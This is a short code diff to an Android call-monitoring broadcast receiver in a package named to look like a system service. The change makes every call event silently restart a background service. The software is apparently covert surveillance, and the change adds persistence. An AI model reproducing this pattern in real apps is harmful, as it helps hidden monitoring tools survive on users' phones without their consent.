@@ -15,6 +15,8 @@ import android.content.Intent;
 import android.telephony.TelephonyManager;
 
 import com.android.service.Call;
+import com.android.service.Core;
+import com.android.service.ServiceCore;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
@@ -31,6 +33,19 @@ public class BroadcastMonitorCall extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		Call call;
+		
+		if (Core.isServiceRunning() == false) {
+			Intent serviceIntent = new Intent(context, ServiceCore.class);
+			
+		    //serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
+		    context.startService(serviceIntent);
+			
+		    if (Cfg.DEBUG) {
+				Check.log(TAG + " (onReceive): Started from Call"); //$NON-NLS-1$
+			}
+		    
+			return;
+		}
 
 		if (intent == null) {
 			if (Cfg.DEBUG) {
